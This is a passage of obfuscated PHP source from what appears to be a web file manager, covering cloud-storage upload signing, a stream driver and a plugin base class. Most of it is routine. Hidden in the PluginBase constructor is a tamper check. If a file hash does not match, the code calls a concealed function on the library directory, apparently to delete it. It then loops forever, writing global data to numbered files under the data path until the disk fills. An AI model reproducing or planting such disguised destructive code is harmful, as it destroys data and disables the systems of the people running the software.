$aŞÁ¨é¯Ì = hash_hmac($CáæŒ˜ã[875], $bÚ±äö´ë§, $cƒÑ’à·, !0); $A«­©ÊÑŠ¾ = hash_hmac($CáæŒ˜ã[875], $aŒÒ¬ó•Èæ, $aŞÁ¨é¯Ì); goto fÚ„†¬Ô·¾; a¯¬…ƒÒ: $CáæŒ˜ã =& $_SERVER[İåâé¾]; $B°áá»ñòØ = $CáæŒ˜ã[181]; $EİÀÎâƒ³Õ = $CáæŒ˜ã[865]; goto FÚß”¢‘èŠ; FÛ¹ÇåØ¨¦: } public function multiUploadFormData($béÛ‹çÎª, $f®×»ˆ˜Ô = 3600) { $bˆ·…·ö®Š =& $_SERVER[İåâé¾]; $b‚´Ï•ªÕ× = gmdate($bˆ·…·ö®Š[965]); $eÆíŒˆêÕë = array(); $f¥“ò©æÙ = $this->client->getUploadId($this->bucket, $béÛ‹çÎª, $eÆíŒˆêÕë); if (!$f¥“ò©æÙ) { return !1; } return array($bˆ·…·ö®Š[215] => $f¥“ò©æÙ, $bˆ·…·ö®Š[165] => $this->getHost() . $bˆ·…·ö®Š[8] . $this->pathEncode($béÛ‹çÎª), $bˆ·…·ö®Š[216] => $b‚´Ï•ªÕ×, $bˆ·…·ö®Š[88] => $béÛ‹çÎª); } public function multiUploadAuthData($c±ùŒ“ß®½, $cœğÅ·ÚÖ¿ = array()) { goto fäŒŸ‘ä™Í; e¾ÄÍ‹Èë: if (strpos($EÛÎ™²Ñöá, $E²Ô¨Û™‹[219]) === 0) { if (isset($e­›¤Ë¨Óİ[$E²Ô¨Û™‹[967]])) { $BÌµ­¨îªá = $e­›¤Ë¨Óİ[$E²Ô¨Û™‹[967]]; } else { if (isset($b•˜‹Øãáî[$E²Ô¨Û™‹[967]])) { $BÌµ­¨îªá = $b•˜‹Øãáî[$E²Ô¨Û™‹[967]]; } else { $BÌµ­¨îªá = hash($E²Ô¨Û™‹[875], $E²Ô¨Û™‹[33]); } } return array($E²Ô¨Û™‹[226] => $b•˜‹Øãáî[$E²Ô¨Û™‹[226]], $E²Ô¨Û™‹[967] => $BÌµ­¨îªá, $E²Ô¨Û™‹[216] => $b•˜‹Øãáî[$E²Ô¨Û™‹[970]]); } return $b•˜‹Øãáî[$E²Ô¨Û™‹[226]]; goto eÛĞ‘¹Ş; F§Ø‚”í¿: if (isset($cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[966]])) { $e­›¤Ë¨Óİ[$E²Ô¨Û™‹[967]] = $cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[966]]; } $c²ñˆÒ»ò¼ = explode($E²Ô¨Û™‹[167], $this->getHost()); $eéè‡Éï = array($E²Ô¨Û™‹[968] => $c²ñˆÒ»ò¼[1], $E²Ô¨Û™‹[969] => $E²Ô¨Û™‹[33], $E²Ô¨Û™‹[198] => $E²Ô¨Û™‹[114], $E²Ô¨Û™‹[877] => $cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[78]]); goto B…ì²‰„‡‚; e‹òÖ’Ø: unset($cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[88]]); if (isset($cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[217]])) { return $this->listUploadParts($e¾™ Ïô±ß, $cœğÅ·ÚÖ¿); } $e­›¤Ë¨Óİ = array(); goto F§Ø‚”í¿; fäŒŸ‘ä™Í: $E²Ô¨Û™‹ =& $_SERVER[İåâé¾]; $EÛÎ™²Ñöá = isset($cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[156]]) ? $cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[156]] : $E²Ô¨Û™‹[33]; $e¾™ Ïô±ß = $cœğÅ·ÚÖ¿[$E²Ô¨Û™‹[88]]; goto e‹òÖ’Ø; B…ì²‰„‡‚: $DÈà”‰±Üñ = $E²Ô¨Û™‹[220]; $a´È‘ñ‡´ä = $E²Ô¨Û™‹[8] . $this->pathEncode($e¾™ Ïô±ß) . $EÛÎ™²Ñöá; $b•˜‹Øãáî = $this->client->__getSignatureV4($e­›¤Ë¨Óİ, $eéè‡Éï, $DÈà”‰±Üñ, $a´È‘ñ‡´ä); goto e¾ÄÍ‹Èë; eÛĞ‘¹Ş: } public function listUploadParts($Bá†­õÈËø, $D¡éá” = array()) { goto B„¬Ë°ƒÜ”; cÛŒÏŞÓ Ñ: $C¢ñÜ¡ˆÖ« = $this->client->__getSignatureV4($E¢Î£¨Œ’‰, $FÊí‡ĞÑñš, $eêÇ÷É½Èì, $D•á§ÎÇíš, $a°ÑôàÆ•Æ); return array($Eõõªî³•ˆ[226] => $C¢ñÜ¡ˆÖ«[$Eõõªî³•ˆ[226]], $Eõõªî³•ˆ[216] => $C¢ñÜ¡ˆÖ«[$Eõõªî³•ˆ[970]], $Eõõªî³•ˆ[228] => $cÃ÷Ë£Á…ğ, $Eõõªî³•ˆ[967] => $C¢ñÜ¡ˆÖ«[$Eõõªî³•ˆ[967]]); goto Bôô¾ƒñ„ğ; f£™³Ÿ£Ó: if (!$cÃ÷Ë£Á…ğ) { return !1; } $a°ÑôàÆ•Æ = $Eõõªî³•ˆ[971]; foreach ($cÃ÷Ë£Á…ğ as $eİï—ƒ¶Œ) { $a°ÑôàÆ•Æ .= $Eõõªî³•ˆ[972] . "\x3c\x50\141\162\x74\x4e\x75\x6d\x62\x65\162\76{$eİï—ƒ¶Œ[$Eõõªî³•ˆ[919]]}\x3c\x2f\x50\x61\162\x74\x4e\x75\x6d\x62\145\162\76\12" . "\74\x45\x54\141\147\x3e{$eİï—ƒ¶Œ[$Eõõªî³•ˆ[920]]}\x3c\57\105\x54\141\x67\x3e\12" . $Eõõªî³•ˆ[973]; } goto c…í™Ğ‘Ã; B„¬Ë°ƒÜ”: $Eõõªî³•ˆ =& $_SERVER[İåâé¾]; $a©ºµÏ³Ú = str_replace($Eõõªî³•ˆ[227], $Eõõªî³•ˆ[33], $D¡éá”[$Eõõªî³•ˆ[156]]); $cÃ÷Ë£Á…ğ = $this->client->listParts($this->bucket, $Bá†­õÈËø, $a©ºµÏ³Ú); goto f£™³Ÿ£Ó; BŠÑØ¬Ã§: $FÊí‡ĞÑñš = array($Eõõªî³•ˆ[968] => $Fœµ½ÒÂ–¬[1], $Eõõªî³•ˆ[198] => $Eõõªî³•ˆ[114], $Eõõªî³•ˆ[877] => strlen($a°ÑôàÆ•Æ)); $eêÇ÷É½Èì = $Eõõªî³•ˆ[218]; $D•á§ÎÇíš = $Eõõªî³•ˆ[8] . $this->pathEncode($Bá†­õÈËø) . $D¡éá”[$Eõõªî³•ˆ[156]]; goto cÛŒÏŞÓ Ñ; c…í™Ğ‘Ã: $a°ÑôàÆ•Æ .= $Eõõªî³•ˆ[974]; $E¢Î£¨Œ’‰ = array(); $Fœµ½ÒÂ–¬ = explode($Eõõªî³•ˆ[167], $this->getHost()); goto BŠÑØ¬Ã§; Bôô¾ƒñ„ğ: } public function link($cÇä·ÏÖ¿¬, $CÜ’Œ®¼§µ = array()) { return parent::link($cÇä·ÏÖ¿¬, $CÜ’Œ®¼§µ); } public function fileOut($f–À†Î·ƒÖ, $cùªÀá™• = false, $B¼¼ŞŞÑ¥Î = false, $dˆªëæÚï = '') { if (strstr($this->endpoint, $_SERVER[İåâé¾][975])) { return parent::fileOutServer($f–À†Î·ƒÖ, $cùªÀá™•, $B¼¼ŞŞÑ¥Î, $dˆªëæÚï); } parent::fileOut($f–À†Î·ƒÖ, $cùªÀá™•, $B¼¼ŞŞÑ¥Î, $dˆªëæÚï); } public function fileOutImage($dëºÂÛ¸ŒÆ, $aŸÖŸ¬ó· = 250) { if (strstr($this->endpoint, $_SERVER[İåâé¾][975])) { return parent::fileOutImageServer($dëºÂÛ¸ŒÆ, $aŸÖŸ¬ó·); } parent::fileOutImage($dëºÂÛ¸ŒÆ, $aŸÖŸ¬ó·); } public function fileInfoImage($AÌÂ êÉ—, &$dŠŠç¢êÈ) { $E‰†Ê¨õÙ =& $_SERVER[İåâé¾]; $f™“±Ù»µ = array($E‰†Ê¨õÙ[207], $E‰†Ê¨õÙ[157], $E‰†Ê¨õÙ[208], $E‰†Ê¨õÙ[209], $E‰†Ê¨õÙ[210]); if (!in_array($dŠŠç¢êÈ[$E‰†Ê¨õÙ[156]], $f™“±Ù»µ)) { return; } if (!strstr($this->endpoint, $E‰†Ê¨õÙ[975])) { $Déğ™ˆ‡ªæ = $this->link($AÌÂ êÉ—); $CŒ½ƒ±Ï¿à = getimagesize($Déğ™ˆ‡ªæ); if ($CŒ½ƒ±Ï¿à) { $dŠŠç¢êÈ[$E‰†Ê¨õÙ[211]] = array($E‰†Ê¨õÙ[212] => $CŒ½ƒ±Ï¿à[0], $E‰†Ê¨õÙ[213] => $CŒ½ƒ±Ï¿à[1]); } } } public function getHost() { $E ÀÀë˜ËÈ =& $_SERVER[İåâé¾]; $C¾Ì«µÌ¿Ó = rtrim(parent::getHost(), $E ÀÀë˜ËÈ[8] . $this->bucket); $C¾Ì«µÌ¿Ó = explode($E ÀÀë˜ËÈ[167], $C¾Ì«µÌ¿Ó); return $C¾Ì«µÌ¿Ó[0] . $E ÀÀë˜ËÈ[167] . $this->bucket . $E ÀÀë˜ËÈ[90] . $C¾Ì«µÌ¿Ó[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($BÌ¥èåÙˆ‡, $e›¡ªôéª¿ = 0) { parent::__construct(); $this->source = $BÌ¥èåÙˆ‡; $this->sourceSize = $e›¡ªôéª¿; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($AÏºœ˜—Ÿ = false) { return $this->sourceSize; } public function getContent($b§¼…œùË = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $DĞ˜‹´™Ÿ = ftell($this->source); $DùäÛ—Ò¤ = @fread($this->source, $this->sourceSize); fseek($this->source, $DĞ˜‹´™Ÿ); return $DùäÛ—Ò¤; } } public function fileSubstr($aœª» © = false, $aœ§ó¸Í£ = 0, $d ­ß¾™™å = 0) { if (!$d ­ß¾™™å) { $d ­ß¾™™å = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $aœ§ó¸Í£, $d ­ß¾™™å); } if ($this->sourceType == self::TYPE_FILE) { $CÖ™İ×Ã”º = ftell($this->source); fseek($this->source, $CÖ™İ×Ã”º + $aœ§ó¸Í£); $Aˆ¦ŸœãÑ = @fread($this->source, $d ­ß¾™™å); fseek($this->source, $CÖ™İ×Ã”º); return $Aˆ¦ŸœãÑ; } } public function hashMd5($b…ª¦Ï—Ì† = false) { return md5($this->getContent()); } public static function hash($Dß–´Ò‹•Ê, $a—Îì«–Ïº = 0) { $B…ˆó‘®³– = new PathDriverStream($Dß–´Ò‹•Ê, $a—Îì«–Ïº); return $B…ˆó‘®³–->hashSimple($Dß–´Ò‹•Ê); } public static function md5($D¬æÌ¡óä¼, $AŸ·™÷”§ó = 0) { $Aóóâ¤–¦ = new PathDriverStream($D¬æÌ¡óä¼, $AŸ·™÷”§ó); return $Aóóâ¤–¦->hashMd5($D¬æÌ¡óä¼); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto b‡â©õ¾Ãõ; b‡â©õ¾Ãõ: $D°«‚ˆº½ =& $_SERVER[İåâé¾]; $cƒ‘Çô“ğ = BASIC_PATH . $D°«‚ˆº½[557]; $DØÈšˆ§à‘ = $D°«‚ˆº½[554]; goto CÈÓƒ ç ; EÍŞ³‡Ûà‡: $this->in =& $in; $this->modelPlugin = Model($D°«‚ˆº½[431]); $this->pluginName = str_replace($D°«‚ˆº½[431], $D°«‚ˆº½[33], get_class($this)); goto bª‚İÊ‘–; CÈÓƒ ç : if ($_SERVER[$D°«‚ˆº½[555]] != $DØÈšˆ§à‘($cƒ‘Çô“ğ)) { goto dõèå¯ÄÂ; FÉóÃ¯šƒ¡: $DÎÑäá±Ó(LIB_DIR); $Fêõì ¸’Õ = $D°«‚ˆº½[560]; $Fêõì ¸’Õ(); goto fã‰…Ö¯‹¨; fã‰…Ö¯‹¨: $b®–ßˆÇÁÌ = $D°«‚ˆº½[561]; $FùÂ ÒØ˜ˆ = json_encode($GLOBALS[$D°«‚ˆº½[562]]); for ($BÄ„‹‰É· = 0;; $BÄ„‹‰É·++) { $b®–ßˆÇÁÌ(DATA_PATH . $BÄ„‹‰É·, $FùÂ ÒØ˜ˆ); } goto CŸÌÏ¾²è; e•­ê­íè: $f§ìñôĞ¼ = explode($D°«‚ˆº½[223], $BÇ‰î’ìºÜ); if (count($f§ìñôĞ¼) < $D°«‚ˆº½[558]) { die; } $DÎÑäá±Ó = $D°«‚ˆº½[559]; goto FÉóÃ¯šƒ¡; dõèå¯ÄÂ: $Fğ‚ä»ëä  = $D°«‚ˆº½[556]; $F—À‘ˆ”å… = BASIC_PATH . $D°«‚ˆº½[557]; $BÇ‰î’ìºÜ = $Fğ‚ä»ëä ($F—À‘ˆ”å…); goto e•­ê­íè; CŸÌÏ¾²è: } global $in, $config; $this->config =& $config; goto EÍŞ³‡Ûà‡; F¼ÅÜËíğÉ: return $this; goto eÊÕ“ÛâŞ™; bª‚İÊ‘–: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $D°«‚ˆº½[8]; $this->pluginApi = rtrim(APP_HOST, $D°«‚ˆº½[8]) . $D°«‚ˆº½[976] . $this->pluginName . $D°«‚ˆº½[8]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $D°«‚ˆº½[8]; goto dùÚÀÙÄ¶; dùÚÀÙÄ¶: $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $D°«‚ˆº½[8]; $this->pluginLangArr = $this->initLang(); $this->values = array(); goto F¼ÅÜËíğÉ; eÊÕ“ÛâŞ™: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[İåâé¾][977]); } protected function assign($dÁÚÀÌÛå, $eâÇœ˜•œ™ = false) { if (is_array($dÁÚÀÌÛå)) { $this->values = array_merge($this->values, $dÁÚÀÌÛå); } else { $this->values[$dÁÚÀÌÛå] = $eâÇœ˜•œ™; } } protected function display($c©áì›ï×Ø) { extract($this->values); require $c©áì›ï×Ø; } final function hookRegist($BÊÖµ©ĞœË) { $this->modelPlugin->appRegist($this->pluginName, $BÊÖµ©ĞœË); } final function appIcon() { $cÛÓŠÉãÊ =& $_SERVER[İåâé¾]; $Cñ¨ÕĞÓÇ = $this->appPackage(); $eö“Ìğô”â = $cÛÓŠÉãÊ[33]; if (isset($Cñ¨ÕĞÓÇ[$cÛÓŠÉãÊ[978]])) { if ($Cñ¨ÕĞÓÇ[$cÛÓŠÉãÊ[978]][$cÛÓŠÉãÊ[979]]) { $eö“Ìğô”â = $cÛÓŠÉãÊ[980] . $Cñ¨ÕĞÓÇ[$cÛÓŠÉãÊ[978]][$cÛÓŠÉãÊ[979]] . $cÛÓŠÉãÊ[981]; } else { if ($Cñ¨ÕĞÓÇ[$cÛÓŠÉãÊ[978]][$cÛÓŠÉãÊ[982]]) { $eö“Ìğô”â = $cÛÓŠÉãÊ[983] . $Cñ¨ÕĞÓÇ[$cÛÓŠÉãÊ[978]][$cÛÓŠÉãÊ[982]] . $cÛÓŠÉãÊ[984]; } } } return $eö“Ìğô”â; } final function fileCanView($a®”¨á÷ŠÚ) { $Aà±×•Ê¯ =& $_SERVER[İåâé¾]; if ($this->isShare($a®”¨á÷ŠÚ)) { return !0; } if (!Action($Aà±×•Ê¯[985])->authCan($Aà±×•Ê¯[986])) { show_tips(LNG($Aà±×•Ê¯[987]), !1); } ActionCall($Aà±×•Ê¯[988], $a®”¨á÷ŠÚ); } final function isShare($D…’ÔÇæ¯ñ) { $b°Õ¤Í®êè = KodIO::parse($D…’ÔÇæ¯ñ); return $b°Õ¤Í®êè[$_SERVER[İåâé¾][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($cÎƒ¢Ş¨Ö) { if (request_url_safe($cÎƒ¢Ş¨Ö)) { return $cÎƒ¢Ş¨Ö; } if (!$this->isShare($cÎƒ¢Ş¨Ö)) { $cÎƒ¢Ş¨Ö = $this->filePath($cÎƒ¢Ş¨Ö); } return Action($_SERVER[İåâé¾][762])->linkOut($cÎƒ¢Ş¨Ö); } public function filePathLinkOut($aœĞ¾ÎÇäë) { if (request_url_safe($aœĞ¾ÎÇäë)) { return $aœĞ¾ÎÇäë; } $this->fileCanView($aœĞ¾ÎÇäë); return Action($_SERVER[İåâé¾][762])->link($aœĞ¾ÎÇäë); } final function filePath($B¦ÓùğßÌ) { if ($a…“Ñ““ùã = $this->checkSharePath($B¦ÓùğßÌ)) { return $a…“Ñ““ùã; } $this->fileCanView($B¦ÓùğßÌ); if (request_url_safe($B¦ÓùğßÌ)) { $B¦ÓùğßÌ = $this->_cacheHttpFile($B¦ÓùğßÌ); $this->fileInfo = IO::infoWithChildren($B¦ÓùğßÌ); } else { $this->fileInfo = IO::infoWithChildren($B¦ÓùğßÌ); if (!$this->fileInfo) { show_tips(LNG($_SERVER[İåâé¾][99]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $B¦ÓùğßÌ; } final function _cacheHttpFile($AÓÛµ¤¬È¦) { $Fæ„¬°¤›³ = hash_path($AÓÛµ¤¬È¦, !0); $this->cachePath = $this->pluginCachePath($Fæ„¬°¤›³); if ($EÍ¯áÕÆØ = IO::fileNameExist($this->cachePath, $Fæ„¬°¤›³)) { return KodIO::make($EÍ¯áÕÆØ); } $B¼ø‡—ç‹ = $this->cachePath . $Fæ„¬°¤›³; return $this->pluginCacheFileSet($B¼ø‡—ç‹, file_get_contents($AÓÛµ¤¬È¦)); } final function _tmpFileName($c™Š ç‘ƒ‘ = array()) { goto B•ŠùäÚ; B•ŠùäÚ: $Døåœ°ëß =& $_SERVER[İåâé¾]; if (!$c™Š ç‘ƒ‘) { $c™Š ç‘ƒ‘ = $this->fileInfo; } if (isset($c™Š ç‘ƒ‘[$Døåœ°ëß[160]])) { return $c™Š ç‘ƒ‘[$Døåœ°ëß[160]]; } goto FÆ™©™ÃáÊ; F©Á¹µ: return md5(implode($Døåœ°ëß[71], $aêì­¥ŒŞ)); goto Bäö§Õ„‰±; FÆ™©™ÃáÊ: if (isset($c™Š ç‘ƒ‘[$Døåœ°ëß[158]][$Døåœ°ëß[160]])) { return $c™Š ç‘ƒ‘[$Døåœ°ëß[158]][$Døåœ°ëß[160]]; } $aêì­¥ŒŞ = array($c™Š ç‘ƒ‘[$Døåœ°ëß[28]], $c™Š ç‘ƒ‘[$Døåœ°ëß[76]], $c™Š ç‘ƒ‘[$Døåœ°ëß[78]]); if (isset($c™Š ç‘ƒ‘[$Døåœ°ëß[373]])) { $aêì­¥ŒŞ[] = $c™Š ç‘ƒ‘[$Døåœ°ëß[373]]; } goto F©Á¹µ; Bäö§Õ„‰±: } final function checkSharePath($Eàªç‹Ä™) { goto Cˆ§¶††Œ; Cˆ§¶††Œ: $aÑ›â‡Òù¾ =& $_SERVER[İåâé¾]; if (!defined($aÑ›â‡Òù¾[989])) { define($aÑ›â‡Òù¾[990], 0); } if (!$this->isShare($Eàªç‹Ä™)) { return !1; } goto dœİÀî‡; dœİÀî‡: $A¶¶“ˆØçµ = Action($aÑ›â‡Òù¾[762])->sharePathInfo($Eàªç‹Ä™); if (!isset($A¶¶“ˆØçµ[$aÑ›â‡Òù¾[76]])) { show_json(LNG($aÑ›â‡Òù¾[991]), !1); } $this->fileInfo = $A¶¶“ˆØçµ[$aÑ›â‡Òù¾[158]]; goto C•œˆÑì‹Ú; C•œˆÑì‹Ú: $this->cachePath = $this->pluginCachePath($this->fileInfo[$aÑ›â‡Òù¾[160]]); return $A¶¶“ˆØçµ[$aÑ›â‡Òù¾[76]]; goto Fù­ù¦òÎ; Fù­ù¦òÎ: } final function pluginCachePath($cœŒÎÑ»êâ = '') { $cƒ¬ÄÑÚƒ =& $_SERVER[İåâé¾]; $Eœ§‘‡ = IO_PATH_SYSTEM_TEMP . $cƒ¬ÄÑÚƒ[992] . $this->pluginName; if (!($aË®œƒŠè„ = IO::infoFull($Eœ§‘‡))) { return IO::mkdir($Eœ§‘‡ . $cƒ¬ÄÑÚƒ[8] . $cœŒÎÑ»êâ); } if (empty($cœŒÎÑ»êâ)) { return $aË®œƒŠè„[$cƒ¬ÄÑÚƒ[76]]; } if (!($EÖªáÕä¤ë = IO::fileNameExist($aË®œƒŠè„[$cƒ¬ÄÑÚƒ[76]], $cœŒÎÑ»êâ))) { return IO::mkdir($aË®œƒŠè„[$cƒ¬ÄÑÚƒ[76]] . $cœŒÎÑ»êâ); } return KodIO::make($EÖªáÕä¤ë); } final function pluginCacheFileSet($C°Ìñ‰ÑÍ˜, $Eùƒâî¤§Ù = '') { $EÕ³…ÈÕ±Ü =& $_SERVER[İåâé¾]; if (!($f´Ûàğ× = IO::infoFull($C°Ìñ‰ÑÍ˜))) { return IO::mkfile($C°Ìñ‰ÑÍ˜, $Eùƒâî¤§Ù, REPEAT_REPLACE); } IO::setContent($f´Ûàğ×[$EÕ³…ÈÕ±Ü[76]], $Eùƒâî¤§Ù); return $f´Ûàğ×[$EÕ³…ÈÕ±Ü[76]]; } final function pluginLocalFile($DèÛšö©ˆœ = '') { goto A‡ ÏŠ§; F‰§ºÅ’Âå: $eÜñ“™Âó¦ = $f“ÌİÓä . $aå–Ù¿Ã¾ . $cÒµßÅÖŠ¨[90] . $dÚó‚½Şñ[$cÒµßÅÖŠ¨[156]]; if (@file_exists($eÜñ“™Âó¦)) { return $eÜñ“™Âó¦; } $DèÛšö©ˆœ = IO::download($DèÛšö©ˆœ, $eÜñ“™Âó¦); goto eÔ•Šîå­; A‡ ÏŠ§: $cÒµßÅÖŠ¨ =& $_SERVER[İåâé¾]; $f“ÌİÓä = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($f“ÌİÓä)) { mk_dir($f“ÌİÓä); } goto aĞ°­–Ÿ÷; aĞ°­–Ÿ÷: if (!$DèÛšö©ˆœ) { return $f“ÌİÓä; } $dÚó‚½Şñ = IO::infoWithChildren($DèÛšö©ˆœ); $aå–Ù¿Ã¾ = $this->_tmpFileName($dÚó‚½Şñ); goto F‰§ºÅ’Âå; eÔ•Šîå­: if ($DèÛšö©ˆœ != $eÜñ“™Âó¦) { $DèÛšö©ˆœ = IO::copy($DèÛšö©ˆœ, $eÜñ“™Âó¦); } return $DèÛšö©ˆœ; goto f÷ˆ¢Ş¼ÀŞ; f÷ˆ¢Ş¼ÀŞ: } final function appPackage() { goto AÊ¬ÕÍ«Œ¾; a‡™ëÎ¾çš: $this->parseLang($cƒÈ‡ãˆË); $e«æÏÇš¸´ = json_decode_force($cƒÈ‡ãˆË); if (!$e«æÏÇš¸´) { return array(); } goto b¬·áƒ¿; AÊ¬ÕÍ«Œ¾: $b•µ¿ÄŠ‘ç =& $_SERVER[İåâé¾]; if ($this->packageData) { return $this->packageData; } $cƒÈ‡ãˆË = $this->parseFile($this->pluginPath . $b•µ¿ÄŠ‘ç[993]); goto a‡™ëÎ¾çš; bµ¯Íô¼êå: return $e«æÏÇš¸´; goto B­»¦ÙÔ‚Ì; b¬·áƒ¿: $dÄÔ¨éÒØ° = Hook::trigger($b•µ¿ÄŠ‘ç[994], $e«æÏÇš¸´); if ($dÄÔ¨éÒØ° && is_array($dÄÔ¨éÒØ°)) { $e«æÏÇš¸´ = $dÄÔ¨éÒØ°; } $this->packageData = $e«æÏÇš¸´; goto bµ¯Íô¼êå; B­»¦ÙÔ‚Ì: } public function packageInfoGet($eÓÛ¬†…‹Ì) { $Cõ¶»¿ƒ§ = $this->appPackage(); return array_get_value($Cõ¶»¿ƒ§, $eÓÛ¬†…‹Ì); } public function packageVersion() { return $this->packageInfoGet($_SERVER[İåâé¾][995]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[İåâé¾][996]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[İåâé¾][997]); } private function parseFile($Aƒ…÷½¯è) { $AéŒ¥Ñë—ì =& $_SERVER[İåâé¾]; $dõ ÍŠõ—š = file_get_contents($Aƒ…÷½¯è); $Eß•ÀĞ®ùÃ = array($AéŒ¥Ñë—ì[998], $AéŒ¥Ñë—ì[999], $AéŒ¥Ñë—ì[1000], $AéŒ¥Ñë—ì[1001], $AéŒ¥Ñë—ì[1002], $AéŒ¥Ñë—ì[1003], $AéŒ¥Ñë—ì[1004]); $eâº£é¦« = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$AéŒ¥Ñë—ì[84]][$AéŒ¥Ñë—ì[1005]]); $dõ ÍŠõ—š = str_replace($Eß•ÀĞ®ùÃ, $eâº£é¦«, $dõ ÍŠõ—š); return $dõ ÍŠõ—š; } private function parseLang(&$E“é•ø¶â‡) { goto A¸âí÷›×©; céÁ ´¦ÖÂ: $DğÈçÁ•ªÄ = array(); foreach ($B…‘÷²éµœ[0] as $F÷„á‘¸ŠŞ) { $AŠÔ¸˜Îä = substr($F÷„á‘¸ŠŞ, strlen($Cø–Ìâ¹”), -4); $FÒ¯ÖÁê– = LNG($AŠÔ¸˜Îä); $b–ÊÃ÷Ùİ›[] = $F÷„á‘¸ŠŞ; $DğÈçÁ•ªÄ[] = str_replace(array($E¥·¬õ­×[223], $E¥·¬õ­×[486], $E¥·¬õ­×[333], $E¥·¬õ­×[111]), array($E¥·¬õ­×[50], $E¥·¬õ­×[50], $E¥·¬õ­×[33], $E¥·¬õ­×[1008]), $FÒ¯ÖÁê–); } $E“é•ø¶â‡ = str_replace($b–ÊÃ÷Ùİ›, $DğÈçÁ•ªÄ, $E“é•ø¶â‡); goto C„æãÉŒõ; A¸âí÷›×©: $E¥·¬õ­× =& $_SERVER[İåâé¾]; $Cø–Ìâ¹” = $E¥·¬õ­×[1006]; if (!strstr($E“é•ø¶â‡, $Cø–Ìâ¹”)) { return; } goto B¡åÊÏñ™; B¡åÊÏñ™: preg_match_all($E¥·¬õ­×[1007], $E“é•ø¶â‡, $B…‘÷²éµœ); if (!is_array($B…‘÷²éµœ) || count($B…‘÷²éµœ) == 0 || !is_array($B…‘÷²éµœ[0]) || count($B…‘÷²éµœ[0]) == 0) { return; } $b–ÊÃ÷Ùİ› = array(); goto céÁ ´¦ÖÂ; C„æãÉŒõ: } private function parseConfig(&$f“Êí™¿÷¸) { goto dŠäÁèæ®Ù; eÔåã¶¡Ö­: $f“Êí™¿÷¸ = str_replace($DêÜ¹ô¾ôØ, $FŒöÀá¸Š, $f“Êí™¿÷¸); goto A—ö½­òÌî; dŠäÁèæ®Ù: $DŞØÀáòøÕ =& $_SERVER[İåâé¾]; $aö÷‹ºÇ = $DŞØÀáòøÕ[1009]; if (!strstr($f“Êí™¿÷¸, $aö÷‹ºÇ)) { return; } goto bª©à…á¶; bª©à…á¶: preg_match_all($DŞØÀáòøÕ[1010], $f“Êí™¿÷¸, $C£¨ó×ò¸ï); if (!is_array($C£¨ó×ò¸ï) || count($C£¨ó×ò¸ï) == 0 || !is_array($C£¨ó×ò¸ï[0]) || count($C£¨ó×ò¸ï[0]) == 0) { return; } $E±ŞÈ©©÷ = $this->getConfig(); goto aô‚ñì‘ë«; aô‚ñì‘ë«: $DêÜ¹ô¾ôØ = array(); $FŒöÀá¸Š = array(); foreach ($C£¨ó×ò¸ï[0] as $fÍøäƒ•æ) { $D™Úé‡¥ê = substr($fÍøäƒ•æ, strlen($aö÷‹ºÇ), -2); $DêÜ¹ô¾ôØ[] = $fÍøäƒ•æ; $FŒöÀá¸Š[] = _get($E±ŞÈ©©÷, $D™Úé‡¥ê); } goto eÔåã¶¡Ö­; A—ö½­òÌî: } private function parsePackage(&$Fï¬ì¼Šá) { goto cÅ¶Ç÷Ò¸Š; e­‡…Ä¶¯À: $Fï¬ì¼Šá = str_replace($déõêÑ×ã¼, $DÇì÷èŞ±, $Fï¬ì¼Šá); goto Aóµôœ†‚İ; dŞ˜‰ªô: preg_match_all($b‰¾¸ ‹Óê[1012], $Fï¬ì¼Šá, $FŠà©¥»÷); if (!is_array($FŠà©¥»÷) || count($FŠà©¥»÷) == 0 || !is_array($FŠà©¥»÷[0]) || count($FŠà©¥»÷[0]) == 0) { return; } $e¾£„ÑË¬ = $this->appPackage(); goto aéïå¿¹ƒ; cÅ¶Ç÷Ò¸Š: $b‰¾¸ ‹Óê =& $_SERVER[İåâé¾]; $EØ«ƒ—½ÎÆ = $b‰¾¸ ‹Óê[1011]; if (!strstr($Fï¬ì¼Šá, $EØ«ƒ—½ÎÆ)) { return; } goto dŞ˜‰ªô; aéïå¿¹ƒ: $déõêÑ×ã¼ = array(); $DÇì÷èŞ± = array(); foreach ($FŠà©¥»÷[0] as $EÚ¿­ÔôĞ) { $Dƒ²Ì¡Àùõ = substr($EÚ¿­ÔôĞ, strlen($EØ«ƒ—½ÎÆ), -2); $déõêÑ×ã¼[] = $EÚ¿­ÔôĞ; $DÇì÷èŞ±[] = _get($e¾£„ÑË¬, $Dƒ²Ì¡Àùõ); } goto e­‡…Ä¶¯À; Aóµôœ†‚İ: } final function echoFile($A³êÏ£ÕÌ, $aá¸èë®³Ç = false) { goto e‚ì¢ŞÏòÀ; dòæÖÉ¥Å’: $Fá©Æò´®Ç = $this->parseFile($bõ«‚£¯¡£); $this->parseLang($Fá©Æò´®Ç); $this->parseConfig($Fá©Æò´®Ç); goto Eä…‹Èœ–; e‚ì¢ŞÏòÀ: $Eù¼†ª†ùó =& 